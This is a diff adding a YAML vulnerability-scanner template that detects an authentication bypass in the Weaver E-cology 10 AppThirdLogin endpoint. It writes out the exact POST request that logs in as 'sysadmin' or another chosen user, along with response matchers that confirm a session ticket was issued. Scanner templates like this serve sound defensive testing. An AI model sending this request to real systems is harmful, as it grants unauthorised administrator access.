@@ -1,0 +1,35 @@
+id: weaver-e-cology-appthirdlogin-anyuser-login
+info:
+  name: Weaver E-cology AppThirdLogin Arbitrary User Login
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: auth-bypass
+  description: |
+    This template detects an authentication bypass vulnerability in Weaver E-cology 10 AppThirdLogin endpoint, allowing arbitrary user login.
+
+variables:
+  user:
+    - "13661633641"
+    - "sysadmin"
+
+http:
+  - raw:
+      - |
+        POST /papi/passport/rest/appThirdLogin?username={{user}}&service=1&ip=1&loginType=third HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":"true"'
+          - '"serviceTicketId":'
+      - type: word
+        part: header
+        words:
+          - "application/json"
